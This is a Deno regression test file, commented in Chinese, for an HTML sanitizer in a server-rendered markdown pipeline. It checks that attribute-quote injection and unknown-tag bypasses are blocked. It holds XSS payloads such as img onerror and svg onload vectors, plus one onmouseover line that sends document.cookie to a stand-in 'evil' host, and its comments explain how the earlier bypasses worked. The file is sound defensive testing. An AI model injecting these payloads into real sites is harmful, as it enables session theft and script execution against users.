/// <reference lib="deno.ns" />
// deno-lint-ignore no-import-prefix -- jsr: 前缀由 deno.lock 固定版本
import { assert, assertEquals, assertStringIncludes } from 'jsr:@std/assert@^1';
import { sanitizeHtmlSync } from '../utils/sanitize.ts';

// ── 无引号属性值内的引号注入（SSR 首屏 XSS）────────────────────────
//
// 回归背景：`simpleSanitize` 的属性值有三个分支，双引号/单引号分支都做了引号转义，
// 唯独无引号分支（正则的 `(\S+)` 捕获组）直接 `"${val}"` 拼接。而 `\S+` 会把
// `x"onerror="alert(1)` 整段吃进 val，于是 `src=x"onerror="alert(1)` 被"净化"成
//
//     <img src="x"onerror="alert(1)">
//
// 浏览器解析出的属性是 src + **onerror** —— 净化器反而构造出了它本要剥离的处理器。
// MarkdownRenderer 在 SSR 分支走 `sanitizeHtmlSync`（客户端才用 DOMPurify），
// 因此该缺陷直接进入题目描述/社区帖子/公告的首屏 HTML；配合
// `script-src 'unsafe-inline'` 的 CSP，内联处理器可执行。

/** 断言净化结果里不含任何 `on*` 内联事件处理器属性。 */
function assertNoEventHandlers(html: string): void {
  const match = html.match(/\son[a-z]+\s*=/gi);
  assertEquals(
    match,
    null,
    `净化结果仍含内联事件处理器：${match?.join(', ')} —— 输出为 ${html}`,
  );
}

Deno.test('sanitize: 无引号属性值内的双引号不得闭合成新属性', () => {
  const out = sanitizeHtmlSync(`<img src=x"onerror="alert(1)>`);
  assertNoEventHandlers(out);
  // 引号必须被实体化，而不是原样拼进属性值
  assertStringIncludes(out, '&quot;');
});

Deno.test('sanitize: 块级 raw HTML 中的 img onerror 载荷被阻断', () => {
  // markdown-it 对块级 HTML 原样透传，因此这段会原封不动到达净化器
  const out = sanitizeHtmlSync(`<div><img src=x"onerror="alert(document.domain)></div>`);
  assertNoEventHandlers(out);
  assert(!out.includes('onerror="alert'), `onerror 载荷存活：${out}`);
});

Deno.test('sanitize: 需交互的 onmouseover 注入同样被阻断', () => {
  const out = sanitizeHtmlSync(`<div title=x"onmouseover="fetch('//evil/'+document.cookie)>x</div>`);
  assertNoEventHandlers(out);
  assert(!out.includes('onmouseover=') || out.includes('&quot;onmouseover=&quot;'));
});

Deno.test('sanitize: 单引号值内注入与表格内注入被阻断', () => {
  for (
    const payload of [
      `<img src='a'onerror='alert(1)'>`,
      `<table><tr><td><img src=x"onerror="alert(1)></td></tr></table>`,
      `<div align=x"onerror="alert(1)>`,
    ]
  ) {
    assertNoEventHandlers(sanitizeHtmlSync(payload));
  }
});

Deno.test('sanitize: 未知标签降级为纯文本时不得重新引入可解析标签', () => {
  // 回归背景：未知标签分支只转义了定界符 `<` / `>`，属性原文照抄。
  // `<foo bar="<img src=x onerror=alert(1)//>">` 因此被"净化"成
  //   &lt;foo bar="<img src=x onerror=alert(1)//&gt;">
  // 其中字面量 `<img ...>` 会被浏览器解析成真标签，onerror 直接执行
  // （SSR 首屏即触发，无需交互）。属性里的 `<` 必须一并实体化。
  const cases: Array<[payload: string, mustBeEscaped: string]> = [
    [`<foo bar="<img src=x onerror=alert(1)//>">`, '&lt;img'],
    [`<foo bar="<img src=x onerror=alert(document.domain)>">`, '&lt;img'],
    [`<xyz a="<svg onload=alert(1)>">`, '&lt;svg'],
    [`<foo bar="<img src=x onerror=window.__xss(777)//>">`, '&lt;img'],
  ];
  for (const [payload, mustBeEscaped] of cases) {
    const out = sanitizeHtmlSync(payload);
    // 注意：这里不能对输出直接跑 `assertNoEventHandlers` —— 转义后的文本里
    // ` onerror=` 仍在（它是**文本**，不是属性），字符串级匹配会误报。
    // 真正的判据是「载荷里的内层标签必须被实体化成 &lt;tag」，即不再可解析。
    // DOM 级断言见 tests/utils/sanitize.spec.ts。
    assertStringIncludes(out, mustBeEscaped);
    // 内层标签不得以字面量形式残留（否则浏览器会当元素解析）
    const literalTag = mustBeEscaped.replace('&lt;', '<');
    assertEquals(out.includes(literalTag), false, `残留字面量 ${literalTag}：${out}`);
  }
});

Deno.test('sanitize: 未知标签降级后文本内容仍可读（不丢字）', () => {
  // 转义必须只做实体化，不能吞掉内容
  const out = sanitizeHtmlSync(`<foo bar="a<b">hi</foo>`);
  assertStringIncludes(out, 'a&lt;b');
  assertStringIncludes(out, 'hi');
  assertStringIncludes(out, '&lt;foo');
  assertStringIncludes(out, '&lt;/foo&gt;');
});

Deno.test('sanitize: 既有防护不回归（script / 危险协议 / 未知标签）', () => {
  assertEquals(sanitizeHtmlSync(`<script>alert(1)</script>`), '');
  // javascript: / data: 协议仍被剥离，且属性一并移除
  assertEquals(sanitizeHtmlSync(`<a href="javascript:alert(1)">x</a>`), '<a>x</a>');
  assertEquals(sanitizeHtmlSync(`<a href="data:text/html,x">x</a>`), '<a>x</a>');
  // 非白名单标签降级为纯文本
  assertStringIncludes(sanitizeHtmlSync(`<iframe src="x"></iframe>`), '&lt;iframe');
  // 白名单外的属性被移除
  assertEquals(sanitizeHtmlSync(`<div style="color:red">x</div>`), '<div>x</div>');
});

Deno.test('sanitize: 正常内容（含 KaTeX / 代码块 / 表格）不被破坏', () => {
  const benign = [
    `<h2>题目说明</h2><p>输出两数之和。</p>`,
    `<img src="https://cdn.example/x.png" alt="图" width="200">`,
    `<a href="https://example.com" target="_blank" rel="noopener">链接</a>`,
    `<span class="katex"><span class="katex-html"><span class="mord">x</span></span></span>`,
    `<pre class="hljs"><code>print(1)</code></pre>`,
    `<table><thead><tr><th>a</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>`,
    `<ol start="3"><li>第三</li></ol>`,
  ];
  for (const html of benign) {
    assertEquals(sanitizeHtmlSync(html), html, `正常内容被改动：${html}`);
  }
  // 无引号属性被规范化成带引号形式（语义等价）
  assertEquals(sanitizeHtmlSync('<img src=/local.png alt=x>'), '<img src="/local.png" alt="x">');
});
